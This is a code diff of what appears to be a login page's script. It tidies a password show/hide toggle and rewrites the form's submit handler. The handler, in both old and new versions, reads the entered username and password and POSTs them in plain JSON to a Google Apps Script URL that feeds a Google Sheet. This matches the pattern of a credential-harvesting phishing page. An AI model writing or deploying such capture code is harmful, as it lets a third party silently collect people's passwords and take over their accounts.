@@ -189,13 +189,8 @@
     const passwordInput = document.getElementById('password');
 
     toggleBtn.addEventListener('click', () => {
-      if (passwordInput.type === 'password') {
-        passwordInput.type = 'text';
-        toggleBtn.style.color = 'white';
-      } else {
-        passwordInput.type = 'password';
-        toggleBtn.style.color = 'rgba(255 255 255 / 0.6)';
-      }
+      passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+      toggleBtn.style.color = passwordInput.type === 'password' ? 'rgba(255 255 255 / 0.6)' : 'white';
     });
 
     toggleBtn.addEventListener('keydown', (e) => {
@@ -205,21 +200,22 @@
       }
     });
 
-    // Google Sheets submission
+    // Submit to Google Sheets
     const loginForm = document.getElementById('loginForm');
-
-    loginForm.addEventListener('submit', async function(e) {
+    loginForm.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
 
       try {
-        const response = await fetch('https://script.google.com/macros/s/AKfycbzeW2B6YLYY_Yn8Q4bQpnqHc2qFHqgNxpepdDjAwpRMJzgyBDmrieKn1oyp6baxRgo-Cw/exec', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' }, // Must include header
-          body: JSON.stringify({ username, password })
-        });
+        const response = await fetch(
+          'https://script.google.com/macros/s/AKfycbzeW2B6YLYY_Yn8Q4bQpnqHc2qFHqgNxpepdDjAwpRMJzgyBDmrieKn1oyp6baxRgo-Cw/exec',
+          {
+            method: 'POST',
+            body: JSON.stringify({ username, password }),
+          }
+        );
 
         const result = await response.json();
         if (result.status === "success") {
